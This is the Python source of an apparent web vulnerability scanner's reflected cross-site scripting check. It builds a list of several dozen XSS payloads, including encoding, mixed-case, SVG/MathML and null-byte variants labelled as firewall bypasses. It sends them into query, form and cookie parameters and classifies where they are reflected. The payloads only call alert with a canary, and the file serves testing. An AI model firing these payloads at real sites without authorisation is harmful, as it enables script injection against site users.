"""
XSS Checks — Phase 1:
  - XssReflectedCheck : reflected XSS via unique canary + WAF bypass techniques

Bypass strategies implemented:
  1. Plain payloads          — break out of HTML/attribute/JS context
  2. URL encoding            — %3C%73%63%72%69%70%74%3E etc.
  3. Double URL encoding     — %253C (percent-encoded percent sign)
  4. HTML entity encoding    — &#x3C;script&#x3E;
  5. Mixed case              — <ScRiPt>, OnErRoR=
  6. Null bytes / tab breaks — <scr\x00ipt>, <img/onerror=
  7. SVG / MathML vectors    — <svg><script>, <math><mtext>
  8. Event handler variants  — onfocus, oncut, onpaste, oninput
  9. Data URI                — <iframe src="data:text/html,<script>">
  10. Template literal       — ${alert('CANARY')}
  11. CSS expression         — style="xss:expression(alert('CANARY'))"
"""
import re
import uuid
from typing import Optional
from urllib.parse import quote

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck


def _url_encode(s: str) -> str:
    """Percent-encode every character in the string."""
    return quote(s, safe="")


def _double_url_encode(s: str) -> str:
    """Double percent-encode (encode the % sign too)."""
    return quote(quote(s, safe=""), safe="")


def _html_entity(s: str) -> str:
    """Convert <, >, ", ' to decimal HTML entities."""
    return (
        s.replace("&", "&amp;")
         .replace("<", "&#60;")
         .replace(">", "&#62;")
         .replace('"', "&#34;")
         .replace("'", "&#39;")
    )


def _build_xss_payloads(canary: str) -> list[tuple[str, str]]:
    """
    Build the full payload matrix for the given canary.
    Returns list of (payload, bypass_technique) tuples.
    """
    c = canary  # short alias

    payloads: list[tuple[str, str]] = []

    # ── 1. Plain context-break payloads ──────────────────────────────────────
    payloads += [
        (f'<script>alert("{c}")</script>',                     "plain-script"),
        (f'"><script>alert("{c}")</script>',                   "plain-break-attr"),
        (f"'><script>alert('{c}')</script>",                   "plain-break-single"),
        (f"<img src=x onerror=alert('{c}')>",                  "plain-img-onerror"),
        (f'"><img src=x onerror=alert("{c}")>',                "plain-break-img"),
        (f"<svg onload=alert('{c}')>",                         "plain-svg"),
        (f"javascript:alert('{c}')",                           "plain-javascript"),
        (f"';alert('{c}')//",                                  "plain-js-break-single"),
        (f'";alert("{c}")//',                                  "plain-js-break-double"),
        (f'" onmouseover="alert(\'{c}\')" x="',               "plain-attr-event"),
        (f"' onmouseover='alert(\"{c}\")' x='",               "plain-attr-event-single"),
    ]

    # ── 2. URL-encoded payloads ───────────────────────────────────────────────
    script_url = _url_encode(f'<script>alert("{c}")</script>')
    img_url    = _url_encode(f"<img src=x onerror=alert('{c}')>")
    payloads += [
        (script_url,  "url-encoded-script"),
        (img_url,     "url-encoded-img"),
    ]

    # ── 3. Double URL-encoded ─────────────────────────────────────────────────
    payloads += [
        (_double_url_encode(f'<script>alert("{c}")</script>'), "double-url-encoded"),
    ]

    # ── 4. HTML entity encoded ────────────────────────────────────────────────
    payloads += [
        (f"&#x3C;script&#x3E;alert(&#x27;{c}&#x27;)&#x3C;/script&#x3E;", "html-entity-hex"),
        (f"&#60;script&#62;alert(&#39;{c}&#39;)&#60;/script&#62;",        "html-entity-dec"),
    ]

    # ── 5. Mixed case ─────────────────────────────────────────────────────────
    payloads += [
        (f"<ScRiPt>alert('{c}')</ScRiPt>",                    "mixed-case-script"),
        (f'<IMG SRC=x OnErRoR=alert("{c}")>',                  "mixed-case-img"),
        (f"<Svg OnLoAd=alert('{c}')>",                         "mixed-case-svg"),
    ]

    # ── 6. Tag variations / self-closing ─────────────────────────────────────
    payloads += [
        (f"<img/src=x/onerror=alert('{c}')>",                 "img-slash-sep"),
        (f"<img src=x onerror=\"alert('{c}')\">",             "img-quoted-handler"),
        (f"<input onfocus=alert('{c}') autofocus>",            "input-autofocus"),
        (f"<body onpageshow=alert('{c}')>",                    "body-onpageshow"),
        (f"<details open ontoggle=alert('{c}')>",              "details-ontoggle"),
        (f"<video src=x onerror=alert('{c}')>",                "video-onerror"),
        (f"<audio src=x onerror=alert('{c}')>",                "audio-onerror"),
        (f"<select onfocus=alert('{c}') autofocus>",           "select-onfocus"),
        (f"<textarea onfocus=alert('{c}') autofocus>",         "textarea-onfocus"),
    ]

    # ── 7. SVG / MathML vectors ───────────────────────────────────────────────
    payloads += [
        (f"<svg><script>alert('{c}')</script></svg>",          "svg-script"),
        (f"<svg><animate onbegin=alert('{c}') attributeName=x dur=1s>", "svg-animate"),
        (f"<math><mtext></mtext><mglyph><image href=x onerror=alert('{c}')></mglyph></math>", "mathml"),
        (f"<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayc+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPiN4\"></svg>", "svg-use-href"),
    ]

    # ── 8. Template literals / JS context ─────────────────────────────────────
    payloads += [
        (f"${{alert('{c}')}}",                                "template-literal"),
        (f"`; alert('{c}') //",                               "backtick-break"),
        (f"\\'; alert('{c}') //",                             "js-escaped-quote"),
    ]

    # ── 9. Data URI ───────────────────────────────────────────────────────────
    payloads += [
        (f"<iframe src=\"data:text/html,<script>alert('{c}')</script>\">", "data-uri-iframe"),
        (f"<a href=\"javascript:alert('{c}')\">click</a>",   "javascript-href"),
        (f"<form action=\"javascript:alert('{c}')\"><input type=submit>", "javascript-form"),
    ]

    # ── 10. CSS / style context ───────────────────────────────────────────────
    payloads += [
        (f"<div style=\"background:url(javascript:alert('{c}')\">",  "css-background"),
        (f"</style><script>alert('{c}')</script>",            "style-break"),
        (f"</script><script>alert('{c}')</script>",           "script-break"),
    ]

    # ── 11. Null byte / comment tricks ────────────────────────────────────────
    payloads += [
        (f"<scr\x00ipt>alert('{c}')</scr\x00ipt>",           "null-byte"),
        (f"<scr<!---->ipt>alert('{c}')</scr<!---->ipt>",      "comment-break"),
        (f"<!--<script>-->alert('{c}')<!--</script>-->",       "html-comment"),
    ]

    return payloads


# Executable context patterns — the canary appears inside an HTML execution context
_REFLECTION_PATTERNS = [
    re.compile(r"<script[^>]*>.*?alert\(['\"]NEXUS_", re.IGNORECASE | re.DOTALL),
    re.compile(r"onerror\s*=\s*['\"]?alert\(['\"]NEXUS_", re.IGNORECASE),
    re.compile(r"onload\s*=\s*['\"]?alert\(['\"]NEXUS_", re.IGNORECASE),
    re.compile(r"onmouseover\s*=\s*['\"]?alert\(['\"]NEXUS_", re.IGNORECASE),
    re.compile(r"javascript:alert\(['\"]NEXUS_", re.IGNORECASE),
    re.compile(r"<svg[^>]+onload\s*=.*?alert\(['\"]NEXUS_", re.IGNORECASE | re.DOTALL),
    re.compile(r"onfocus\s*=\s*['\"]?alert\(['\"]NEXUS_", re.IGNORECASE),
    re.compile(r"ontoggle\s*=\s*['\"]?alert\(['\"]NEXUS_", re.IGNORECASE),
    re.compile(r"onpageshow\s*=\s*['\"]?alert\(['\"]NEXUS_", re.IGNORECASE),
    re.compile(r"onbegin\s*=\s*['\"]?alert\(['\"]NEXUS_", re.IGNORECASE),
]


class XssReflectedCheck(BaseScanCheck):
    check_id = "xss-reflected"
    check_type = CheckType.ACTIVE
    name = "Cross-Site Scripting (Reflected)"
    description = "Detects reflected XSS by injecting payloads and checking for unencoded reflection"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        results: list[CheckResult] = []

        # Use a unique canary per insertion point session so we can correlate
        canary = f"NEXUS_{uuid.uuid4().hex[:8]}"

        # Baseline: send benign value to get clean response (canary MUST not appear here)
        benign_body = ""
        benign_resp = None
        try:
            benign_resp, _, _ = await self._send_probe(
                client, insertion_point, insertion_point.value or "nexus_benign_test"
            )
            benign_body = benign_resp.text
        except Exception:
            pass

        # ── Content-Type gate ─────────────────────────────────────────────────
        # XSS only applies to HTML responses. A JSON or binary endpoint can reflect
        # arbitrary content but the browser will not render it as HTML, so there is
        # no XSS execution surface.
        if benign_resp is not None:
            ct = benign_resp.headers.get("content-type", "")
            if ct and not self._ct_is_html(ct):
                return results  # Not HTML — XSS cannot fire in browser

        # Anti-hallucination: if canary already appears in baseline → skip entirely
        if canary in benign_body:
            return results

        for payload, technique in _build_xss_payloads(canary):
            try:
                resp, req_raw, curl = await self._send_probe(
                    client, insertion_point, payload
                )
            except Exception:
                continue

            reflected, context = _detect_reflection(resp.text, canary, payload)
            if reflected:
                # Pinpoint where in the response the canary appears
                idx = resp.text.find(canary)
                snippet = resp.text[max(0, idx - 40): idx + len(canary) + 80] if idx >= 0 else ""
                evidence = self._make_evidence(
                    request_raw=req_raw,
                    response=resp,
                    baseline=benign_resp,
                    payload=payload,
                    highlighted_evidence=snippet,
                    poc_curl=curl,
                )
                # Confidence depends on context + bypass technique used
                if context == "executable":
                    confidence = Confidence.CERTAIN if technique.startswith("plain") else Confidence.FIRM
                else:
                    confidence = Confidence.TENTATIVE

                results.append(
                    CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=confidence,
                        severity=Severity.HIGH,
                        cvss=7.4,
                        description=(
                            f"Reflected XSS detected in {context} context via {technique} bypass. "
                            f"Payload reflected unencoded in response. "
                            f"Parameter: {insertion_point.name!r}"
                        ),
                        evidence=evidence,
                        insertion_point=insertion_point,
                    )
                )
                break  # one finding per insertion point

        return results

    async def _send_probe(
        self,
        client: httpx.AsyncClient,
        ip: InsertionPoint,
        payload: str,
    ) -> tuple[httpx.Response, str, str]:
        method = ip.method.upper()
        headers: dict = {}

        if ip.ip_type == IPType.QUERY_PARAM:
            url = self._build_url(ip, payload)
            req_raw = self._build_request_line(method, url, headers)
            curl = self._poc_curl(method, url)
            resp = await client.request(method, url, headers=headers)

        elif ip.ip_type == IPType.BODY_PARAM:
            url = ip.url
            form_data = {ip.name: payload}
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            body_str = "&".join(f"{k}={v}" for k, v in form_data.items())
            req_raw = self._build_request_line(method, url, headers, body_str)
            curl = self._poc_curl(method, url, headers, body_str)
            resp = await client.post(url, data=form_data, headers=headers)

        elif ip.ip_type == IPType.COOKIE:
            url = ip.url
            headers["Cookie"] = f"{ip.name}={payload}"
            req_raw = self._build_request_line(method, url, headers)
            curl = self._poc_curl(method, url, headers)
            resp = await client.request(method, url, headers=headers)

        else:
            raise ValueError(f"XssReflectedCheck: unsupported ip_type {ip.ip_type}")

        return resp, req_raw, curl


# ---------------------------------------------------------------------------
# Reflection analysis
# ---------------------------------------------------------------------------

def _detect_reflection(
    body: str, canary: str, payload: str
) -> tuple[bool, str]:
    """
    Strict context-aware XSS reflection detection.

    Returns (reflected, context):
      "executable"  — payload in script/event-handler → HIGH severity, CERTAIN
      "html"        — raw unencoded HTML tag injected → HIGH severity, FIRM
      "attribute"   — inside HTML attribute value (could escape) → MEDIUM, TENTATIVE
      "encoded"     — HTML-encoded (not exploitable) → False
      "none"        — not reflected → False

    Anti-FP rules:
      - Plain text reflection ("You searched for: NEXUS_") → NOT reported
      - HTML-encoded payload → NOT reported
      - Canary only in URL/href without executable context → NOT reported
    """
    if canary not in body:
        return False, "none"

    # ── 0. Bail early if payload was HTML-encoded ─────────────────────────────
    if "<" in payload:
        encoded_forms = [
            payload.replace("<", "&lt;"),
            payload.replace("<", "&#60;"),
            payload.replace("<", "&#x3c;"),
            payload.replace("<", "&#x3C;"),
        ]
        for ef in encoded_forms:
            if ef[:20] in body:
                return False, "encoded"

    # ── 0b. Bail if canary is inside an HTML comment ──────────────────────────
    # <!-- ... CANARY ... --> is not executed by the browser.
    _comment_re = re.compile(r'<!--.*?-->', re.DOTALL)
    for comment in _comment_re.finditer(body):
        if canary in comment.group(0):
            return False, "comment"

    # ── 0c. Bail if canary is inside a JS string literal ─────────────────────
    # Detects: var x = "CANARY" / var x = 'CANARY' / `CANARY`
    # The payload tag won't execute inside a quoted string — it's inert data.
    idx_c = body.find(canary)
    if idx_c >= 0:
        before3 = body[max(0, idx_c - 2): idx_c]
        after3  = body[idx_c + len(canary): idx_c + len(canary) + 2]
        # Surrounded by matching quotes → JS string, not executable
        in_js_string = (
            (before3.endswith('"') and '"' in after3) or
            (before3.endswith("'") and "'" in after3) or
            (before3.endswith("`") and "`" in after3)
        )
        if in_js_string:
            # Still executable if the PAYLOAD contains the closing quote as a breakout
            # e.g. payload = '";alert(1)//' → breaks the string → executable
            has_quote_breakout = (
                ('"' in payload and before3.endswith('"')) or
                ("'" in payload and before3.endswith("'"))
            )
            if not has_quote_breakout:
                return False, "js-string"
            else:
                in_js_string = False  # breakout present — payload escapes the string

    # ── 1. Structured executable-context patterns ─────────────────────────────
    for pattern in _REFLECTION_PATTERNS:
        pat_str = pattern.pattern.replace("NEXUS_", re.escape(canary[:6]))
        try:
            if re.compile(pat_str, pattern.flags).search(body):
                return True, "executable"
        except re.error:
            pass

    # ── 2. Inspect surrounding context window ─────────────────────────────────
    idx = body.find(canary)
    snippet = body[max(0, idx - 120): idx + 200]

    # Strip any comments from snippet before checking for script tags
    snippet_no_comments = re.sub(r'<!--.*?-->', '', snippet, flags=re.DOTALL)

    # Executable context within the snippet (excluding comment content)
    exec_ctx = [
        (r"<script[^>]*>",              "script tag"),
        (r"\bon\w+\s*=\s*[^\s>]*",      "event handler"),
        (r"javascript\s*:",             "javascript URI"),
        (r"<svg[^>]*>",                 "SVG element"),
        (r"<iframe[^>]*>",              "iframe element"),
        (r"expression\s*\(",            "CSS expression"),
    ]
    for pat, ctx_name in exec_ctx:
        if re.search(pat, snippet_no_comments, re.IGNORECASE):
            # Extra check for <script> tag context: ensure canary is NOT in a JS string
            if "script" in pat and in_js_string if idx_c >= 0 else False:
                continue  # Inside script block but in a JS string — skip
            return True, "executable"

    # ── 3. Raw unencoded HTML tag injection ───────────────────────────────────
    # The payload must start with < and that < must NOT be encoded in the body
    if payload.startswith("<"):
        tag_match = re.search(r"<([a-zA-Z]+)", payload)
        if tag_match:
            tag = tag_match.group(0).lower()  # e.g. "<script"
            # Check it appears unencoded (not as &lt;script)
            if tag in body.lower() and "&lt;" + tag[1:] not in body.lower():
                return True, "html"
    elif payload.startswith('"><') or payload.startswith("'><"):
        # Attribute breakout
        inner_tag = re.search(r"<([a-zA-Z]+)", payload)
        if inner_tag and inner_tag.group(0).lower() in body.lower():
            return True, "html"

    # ── 4. Canary in HTML attribute value ─────────────────────────────────────
    # Must be inside an attribute: attr="...canary..." or attr='...canary...'
    # NOT inside plain text content
    attr_pattern = rf'(?:value|href|src|action|data[^=]*)\s*=\s*["\'][^"\']*{re.escape(canary)}'
    if re.search(attr_pattern, body, re.IGNORECASE):
        return True, "attribute"

    # ── 5. Canary in event-handler attribute (without the alert) ─────────────
    event_attr_pattern = rf'on\w+\s*=\s*["\'][^"\']*{re.escape(canary)}'
    if re.search(event_attr_pattern, body, re.IGNORECASE):
        return True, "executable"

    # ── 6. Everything else: plain text reflection → NOT XSS ─────────────────
    # If we reach here, the canary appeared but NOT in any executable or attribute
    # context — it's just echoed as plain text (e.g., "You searched for: NEXUS_xxx")
    # This is NOT an XSS vulnerability.
    return False, "none"
